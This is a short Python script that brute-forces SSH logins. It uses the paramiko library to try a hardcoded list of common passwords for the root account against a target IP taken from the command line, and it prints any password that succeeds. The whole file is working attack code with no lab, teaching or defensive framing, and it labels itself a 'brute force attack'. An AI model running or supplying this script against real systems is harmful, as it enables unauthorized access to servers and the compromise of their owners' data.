import paramiko
import sys

if len(sys.argv) != 2:
    print("Usage: python brute_force.py <target_ip>")
    sys.exit(1)

target_ip = sys.argv[1]

# Load username & password list
username = "root"
passwords = ["admin", "123456", "password", "toor", "root123"]

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

print(f"🔍 Brute force attack on {target_ip} (SSH)...")

for password in passwords:
    try:
        ssh.connect(target_ip, username=username, password=password, timeout=3)
        print(f"🔥 SUCCESS! Password found: {password}")
        ssh.close()
        break
    except paramiko.AuthenticationException:
        print(f"❌ Failed: {password}")
    except Exception as e:
        print(f"⚠️ Error: {e}")
        break

print("🛑 Brute force attack completed.")
